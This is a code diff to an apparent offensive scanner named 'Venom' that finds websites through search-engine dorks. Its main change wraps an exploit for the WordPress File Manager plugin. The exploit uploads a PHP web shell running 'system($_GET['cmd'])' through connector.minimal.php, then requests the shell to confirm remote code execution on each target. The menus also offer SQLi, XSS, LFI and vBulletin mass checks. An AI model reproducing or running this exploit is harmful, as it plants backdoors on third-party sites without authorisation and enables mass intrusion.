@@ -39,7 +39,8 @@ import async_timeout
 import inspect
 from functools import wraps
 import toxin
-from urllib3.exceptions import InsecureRequestWarning
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 def logo():
@@ -50,12 +51,13 @@ def logo():
     xss_list_counter()
     misc_list_counter()
     print(
+        B +
         """
 
                                                    :=*#%%@%%#+-:         :-=+****+=:.
-         Venom <  4.3.3  >                      .+%@@@@@@%*==--=+#%#+- :**+--:...::=+#%*-
+         Venom <  4.3.4  >                      .+%@@@@@@%*==--=+#%#+- :**+--:...::=+#%*-
       Enhanced Dorking & Vuln Scans           :#@@@@@@@+.          :=*%#=.             -#%-
-          Now with eleet banner              +@@@@@@@@:     :**=+***+====*#=.            :%#.
+          Now with eleet banner "             +@@@@@@@@:     :**=+***+====*#=.            :%#.
                           ...........:---. #@@@@@@@@-     -@.-=::::-=--+=+#@*:            #%
                     :---:....::::.        =@@@@@@@@*      =%.+-#+++=:--:+=+%@@%-           %#
                 -=+*+*#%@@@@@@@@@@@@@%%#*:%@@@@@@@=        %:%@@@@@@@#*=:--+#@@@%:         -@-
@@ -151,24 +153,11 @@ def vbulletin_test():
 
 
 def wp_filemanager_scanning(url):
-    path = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
-    url = url.rsplit(sites, 1)[0]
-    url = url + sites
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
-        "Accept": "*/*",
-        "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate",
-        "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
-        "Connection": "close",
-    }
-    data = '-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="reqid"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="target"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="upload[]"; filename="payl04dz.php"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET[\'cmd\']); echo \'v3n0m\'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="mtime[]"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n'
-    req = requests.post(
-        url + path, headers=headers, data=data, timeout=10, verify=False
-    )
-    if req:
-        p4th = url + "/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php"
-        head3r = {
+    try:
+        path = "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+        url = url.rsplit(sites, 1)[0]
+        url = url + sites
+        headers = {
             "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
             "Accept": "*/*",
             "Accept-Language": "en-US,en;q=0.5",
@@ -176,11 +165,27 @@ def wp_filemanager_scanning(url):
             "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
             "Connection": "close",
         }
-        payload = requests.get(p4th, headers=head3r, timeout=10, verify=False)
-        if "v3n0m" in payload.text:
-            print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
-            vuln.append(url)
-            misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")
+        data = '-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="reqid"\r\n\r\n1744f7298611ba\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="cmd"\r\n\r\nupload\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="target"\r\n\r\nl1_Lw\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="upload[]"; filename="payl04dz.php"\r\nContent-Type: application/php\r\n\r\n<?php system($_GET[\'cmd\']); echo \'v3n0m\'; ?>\n\r\n-----------------------------42474892822150178483835528074\r\nContent-Disposition: form-data; name="mtime[]"\r\n\r\n1597850374\r\n-----------------------------42474892822150178483835528074--\r\n'
+        req = requests.post(
+            url + path, headers=headers, data=data, timeout=10, verify=False
+        )
+        if req:
+            p4th = url + "/wp-content/plugins/wp-file-manager/lib/files/payl04dz.php"
+            head3r = {
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "*/*",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Content-Type": "multipart/form-data; boundary=---------------------------42474892822150178483835528074",
+                "Connection": "close",
+            }
+            payload = requests.get(p4th, headers=head3r, timeout=10, verify=False)
+            if "v3n0m" in payload.text:
+                print(url + "Vuln Found ====> Wordpress File Manager > 6.9 RCE")
+                vuln.append(url)
+                misc_log_file.write("\n" + url + " Wordpress File Manager > 6.9 RCE")
+    except:
+        pass
 
 
 class WPFM_Thread(threading.Thread):
@@ -1090,6 +1095,7 @@ downloads = [
 
 
 async def search(pages_pulled_as_one):
+    random.shuffle(loaded_Dorks)
     urls = []
     urls_len_last = 0
     timestart = datetime.now()
@@ -1209,7 +1215,7 @@ def f_menu():
     if endsub != 1:
         scan_option()
     logo()
-    print("[1] Dork and Vuln Scan")
+    print(R + "[1] Dork and Vuln Scan")
     print("[2] Admin page finder")
     print("[3] Toxin - Mass IP/port/services *Not Released Yet* ")
     print("[4] DNS brute")
@@ -1279,7 +1285,7 @@ def f_menu():
         print(W + "")
         os.system("clear")
         logo()
-        print(" [1] Skip to SQLi list checking")
+        print(R + " [1] Skip to SQLi list checking")
         print(" [2] SKip to XSS list checking")
         print(" [3] Skip to LFI list checking")
         print(" [4] Skip to Vbulletin 5.x list checking ")
